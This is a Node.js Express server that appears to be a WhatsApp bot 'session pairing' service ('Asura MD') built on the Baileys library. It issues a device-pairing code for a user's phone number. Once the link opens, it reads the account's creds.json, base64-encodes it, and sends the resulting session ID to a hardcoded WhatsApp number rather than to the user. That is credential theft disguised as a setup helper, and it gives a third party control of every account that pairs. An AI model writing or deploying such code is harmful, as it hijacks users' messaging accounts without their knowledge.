import express from 'express';
import { makeWASocket, useMultiFileAuthState, delay, Browsers } from '@whiskeysockets/baileys';
import pino from 'pino';
import fs from 'fs';
import path from 'path';
import { fileURLToPath } from 'url';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
const port = process.env.PORT || 3000;

// 1. പ്രധാനപ്പെട്ട മാറ്റം: HTML ഫയൽ കാണിക്കാൻ ഇത് സഹായിക്കും
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

app.get('/pair', async (req, res) => {
    let phone = req.query.number; 
    if (!phone) return res.send({ error: "Phone number is required" });

    const id = Math.random().toString(36).substring(7);
    const { state, saveCreds } = await useMultiFileAuthState(`./temp_${id}`);

    try {
        const sock = makeWASocket({
            auth: state,
            printQRInTerminal: false,
            logger: pino({ level: "silent" }),
            browser: Browsers.macOS("Desktop")
        });

        if (!sock.authState.creds.registered) {
            await delay(1500);
            phone = phone.replace(/[^0-9]/g, '');
            const code = await sock.requestPairingCode(phone);
            res.send({ code: code });
        }

        sock.ev.on('creds.update', saveCreds);
        sock.ev.on('connection.update', async (update) => {
            const { connection } = update;
            if (connection === 'open') {
                await delay(5000);
                
                const authFile = fs.readFileSync(`./temp_${id}/creds.json`);
                const sessionId = Buffer.from(authFile).toString('base64');

                const myNumber = "917736811908@s.whatsapp.net";
                const sessionText = `Asura_MD_${sessionId}`;
                
                const welcomeMsg = `*👺 ASURA MD SESSION CONNECTED*\n\n\`${sessionText}\`\n\n> Don't share this ID!`;
                
                await sock.sendMessage(myNumber, { text: welcomeMsg });
                await sock.sendMessage(myNumber, { text: sessionText }); // കോപ്പി ചെയ്യാൻ എളുപ്പത്തിന്

                await delay(2000);
                // ഫയലുകൾ ഡിലീറ്റ് ചെയ്യുന്നു
                fs.rmSync(`./temp_${id}`, { recursive: true, force: true });
                // സർവർ ഓഫ് ചെയ്യുന്നതിന് പകരം ഈ സോക്കറ്റ് മാത്രം എൻഡ് ചെയ്യുന്നു
                sock.end();
            }
        });

    } catch (err) {
        console.log(err);
        res.status(500).send({ error: "Server Busy" });
    }
});

app.listen(port, () => console.log(`Asura MD Pairing Server on port ${port}`));
